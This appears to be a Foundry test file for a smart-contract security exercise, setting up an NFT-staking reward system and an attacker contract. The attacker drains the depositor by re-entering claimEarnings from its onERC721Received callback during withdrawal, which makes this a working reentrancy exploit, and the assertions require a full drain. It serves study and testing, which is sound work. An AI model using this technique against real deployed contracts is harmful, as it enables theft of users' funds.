// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/RewardToken.sol";

contract RewardTokenTest is Test {
    RewardToken public rewardToken;
    RewardTokenAttacker public attacker;
    NftToStake public nftToStake;
    Depositoor public depositoor;
    address public attackerWallet;

    function setUp() public {
        attackerWallet = address(0x1234);

        attacker = new RewardTokenAttacker();
        nftToStake = new NftToStake(address(attacker));
        depositoor = new Depositoor(nftToStake);
        rewardToken = new RewardToken(address(depositoor));

        depositoor.setRewardToken(rewardToken);
    }

    function testExploit() public {
        // Conduct your attack here
        attacker.deposit(nftToStake, depositoor);

        skip(6 days);

        attacker.attack();
        // Assertions
        assertEq(
            rewardToken.balanceOf(address(attacker)), 100 ether, "Balance of attacking contract must be 100e18 tokens"
        );
        assertEq(rewardToken.balanceOf(address(depositoor)), 0, "Attacked contract must be fully drained");
        assertLt(vm.getNonce(attackerWallet), 3, "must exploit in two transactions or less");
    }
}

contract RewardTokenAttacker {
    NftToStake public nft;
    Depositoor public depositor;

    function deposit(NftToStake _nft, Depositoor _depositor) external {
        nft = _nft;
        depositor = _depositor;
        // nft.approve(depositor, 42);
        nft.safeTransferFrom(address(this), address(depositor), 42);
    }

    function attack() external {
        depositor.withdrawAndClaimEarnings(42);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        depositor.claimEarnings(42);
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }
}
